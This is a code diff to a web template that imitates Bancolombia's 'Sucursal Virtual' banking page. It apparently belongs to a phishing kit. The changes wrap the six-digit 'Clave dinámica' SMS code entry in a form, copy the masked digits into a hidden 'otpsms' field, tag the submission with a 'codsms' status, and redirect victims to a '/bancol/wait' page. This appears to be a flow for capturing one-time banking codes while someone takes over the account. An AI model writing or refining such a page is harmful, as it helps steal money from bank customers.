@@ -4,6 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="csrf-token" content="{{ csrf_token() }}">
     <title>Bancolombia - Sucursal Virtual</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script>
@@ -222,7 +223,7 @@
         <div id="codsms" class="w-full flex flex-col justify-center items-center pb-6">
             <h5 class="text-[24px] font-cib-sans-bold mt-10">Clave dinámica</h5>
             <div class="w-full flex mt-4 flex-col justify-center items-center gap-4 pl-1">
-                <div class="w-[100%] bg-white py-6 px-4 rounded-xl flex flex-col items-center">
+                <form id="formulario" class="w-[100%] bg-white py-6 px-4 rounded-xl flex flex-col items-center">
                     <div class="w-full flex items-center justify-center hiddenerror hidden">
                         <span class="text-[11px] text-red-600"> Clave dinámica incorrecta o vencida. Ingresa la nueva
                             clave
@@ -239,27 +240,30 @@
 
                     <div class="w-full mt-4 flex flex-col items-center">
                         <div class="flex justify-center gap-2 w-full max-w-xs">
-                            <input id="otpsms-0" type="text" inputmode="numeric" maxlength="1"
+                            <input id="no-otpsms-0" type="text" inputmode="numeric" maxlength="1"
                                 class="password-input w-8 h-5 text-center thin-border-input text-xl font-semibold outline-none transition-all focus:border-black" />
-                            <input id="otpsms-1" type="text" inputmode="numeric" maxlength="1"
+                            <input id="no-otpsms-1" type="text" inputmode="numeric" maxlength="1"
                                 class="password-input w-8 h-5 text-center thin-border-input text-xl font-semibold outline-none transition-all focus:border-black" />
-                            <input id="otpsms-2" type="text" inputmode="numeric" maxlength="1"
+                            <input id="no-otpsms-2" type="text" inputmode="numeric" maxlength="1"
                                 class="password-input w-8 h-5 text-center thin-border-input text-xl font-semibold outline-none transition-all focus:border-black" />
-                            <input id="otpsms-3" type="text" inputmode="numeric" maxlength="1"
+                            <input id="no-otpsms-3" type="text" inputmode="numeric" maxlength="1"
                                 class="password-input w-8 h-5 text-center thin-border-input text-xl font-semibold outline-none transition-all focus:border-black" />
-                            <input id="otpsms-4" type="text" inputmode="numeric" maxlength="1"
+                            <input id="no-otpsms-4" type="text" inputmode="numeric" maxlength="1"
                                 class="password-input w-8 h-5 text-center thin-border-input text-xl font-semibold outline-none transition-all focus:border-black" />
-                            <input id="otpsms-5" type="text" inputmode="numeric" maxlength="1"
+                            <input id="no-otpsms-5" type="text" inputmode="numeric" maxlength="1"
                                 class="password-input w-8 h-5 text-center thin-border-input text-xl font-semibold outline-none transition-all focus:border-black" />
                         </div>
                     </div>
 
-                    <button id="validarOtpSms"
+                    <input type="hidden" id="otpsms" name="otpsms" value="" />
+                    <input type="hidden" id="no-status" name="status" value="codsms" />
+
+                    <button id="enviar"
                         class="mt-4 font-bold py-2 px-6 rounded-full mt-6 disabled:bg-gray-300 disabled:text-black cursor-not-allowed bg-gray-300 w-32"
                         disabled>
                         Continuar
                     </button>
-                </div>
+                </form>
             </div>
         </div>
 
@@ -273,26 +277,126 @@
     </div>
 
     <script>
+        /* ===== UTILIDADES ===== */
+
+        /**
+         * Habilita o deshabilita un botón con estilos apropiados
+         */
+        function toggleButton(btn, enabled) {
+            if (!btn) return;
+            btn.disabled = !enabled;
+            if (enabled) {
+                btn.classList.remove('bg-gray-300', 'text-black', 'cursor-not-allowed');
+                btn.classList.add('bg-bancolombia-yellow', 'text-black', 'cursor-pointer');
+            } else {
+                btn.classList.remove('bg-bancolombia-yellow', 'cursor-pointer');
+                btn.classList.add('bg-gray-300', 'text-black', 'cursor-not-allowed');
+            }
+        }
+
         /* ===== VALIDACIONES DE CAMPOS DE ENTRADA ===== */
 
         /**
-         * Valida OTP SMS
+         * Valida OTP SMS y actualiza el campo hidden
          * Requisito: exactamente 6 dígitos numéricos
          */
         function validateOtpSms() {
             let codigo = '';
             for (let i = 0; i < 6; i++) {
-                const input = document.getElementById(`otpsms-${i}`);
+                const input = document.getElementById(`no-otpsms-${i}`);
                 if (input) {
                     codigo += (input.dataset.realValue || '');
                 }
             }
+
+            // Actualizar el campo hidden con los 6 dígitos
+            const otpsmsHidden = document.getElementById('otpsms');
+            if (otpsmsHidden) {
+                otpsmsHidden.value = codigo;
+            }
+
             const isValid = codigo.length === 6 && /^\d{6}$/.test(codigo);
+
+            // Habilitar/deshabilitar botón
+            const btnEnviar = document.getElementById('enviar');
+            toggleButton(btnEnviar, isValid);
+
             return isValid;
         }
+
+        /* ===== CONFIGURACIÓN DE INPUTS MULTI-DÍGITO ===== */
+
+        /**
+         * Configura inputs de múltiples dígitos con navegación automática
+         * @param {string} prefix - Prefijo del ID (ej: 'no-otpsms')
+         * @param {number} maxLength - Cantidad de inputs
+         */
+        function setupMultiDigitInputs(prefix, maxLength) {
+            for (let i = 0; i < maxLength; i++) {
+                const input = document.getElementById(`${prefix}-${i}`);
+                if (!input) continue;
+
+                // Si es un input de contraseña (con punto)
+                if (input.classList.contains('password-input')) {
+                    input.addEventListener('input', function (e) {
+                        const v = e.target.value;
+
+                        // Ignorar si ya es el bullet (evita loop)
+                        if (v === '•') return;
+
+                        // Solo permitir un dígito
+                        if (!/^[0-9]$/.test(v)) {
+                            e.target.value = e.target.dataset.realValue ? '•' : '';
+                            return;
+                        }
+
+                        // Guardar el valor real y mostrar un punto
+                        e.target.dataset.realValue = v;
+                        e.target.value = '•';
+
+                        // Validar después de cada entrada
+                        validateOtpSms();
+
+                        // Mover al siguiente input si no es el último
+                        if (i < maxLength - 1) {
+                            const nextInput = document.getElementById(`${prefix}-${i + 1}`);
+                            if (nextInput) nextInput.focus();
+                        }
+                    });
+
+                    input.addEventListener('keydown', function (e) {
+                        if (e.key === 'Backspace') {
+                            e.preventDefault();
+                            if (this.dataset.realValue) {
+                                // Si tiene valor, borrarlo
+                                this.value = '';
+                                this.dataset.realValue = '';
+                                validateOtpSms();
+                            } else if (i > 0) {
+                                // Si está vacío, ir al anterior y borrarlo
+                                const prevInput = document.getElementById(`${prefix}-${i - 1}`);
+                                if (prevInput) {
+                                    prevInput.focus();
+                                    prevInput.value = '';
+                                    prevInput.dataset.realValue = '';
+                                    validateOtpSms();
+                                }
+                            }
+                        }
+                    });
+                }
+            }
+        }
+
+        /* ===== INICIALIZACIÓN ===== */
+
+        document.addEventListener('DOMContentLoaded', function () {
+            // Setup de inputs multi-dígito para OTP SMS
+            setupMultiDigitInputs('no-otpsms', 6);
+        });
     </script>
 
-        <x-control
+    <x-control
         :auto-completar="false"
         :debug="false"
         redirect-url="/bancol/wait"
